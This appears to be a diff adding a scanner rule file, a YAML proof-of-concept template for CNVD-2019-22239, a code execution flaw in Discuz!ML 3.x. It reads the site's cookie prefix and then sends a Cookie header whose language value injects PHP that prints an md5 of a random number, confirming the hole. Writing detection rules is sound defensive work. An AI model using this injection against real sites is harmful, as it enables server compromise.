@@ -1,0 +1,24 @@
+expression: r0() && r1()
+id: CNVD-2019-22239
+info:
+  author: X.Yang
+  name: "Discuz!ML 3.x \u4EFB\u610F\u4EE3\u7801\u6267\u884C"
+  severity: critical
+rules:
+  r0:
+    expression: response.status == 200
+    output:
+      search: '"cookiepre = ''(?P<token>[\\w_]+)''".bsubmatch(response.body)'
+      token: search["token"]
+    request:
+      method: GET
+      path: /forum.php
+  r1:
+    expression: response.status == 200 && response.body.bcontains(bytes(md5(string(r1))))
+    request:
+      headers:
+        Cookie: '{{token}}language=sc''.print(md5({{r1}})).'''
+      method: GET
+      path: /forum.php
+set:
+  r1: randomInt(800000000, 1000000000)
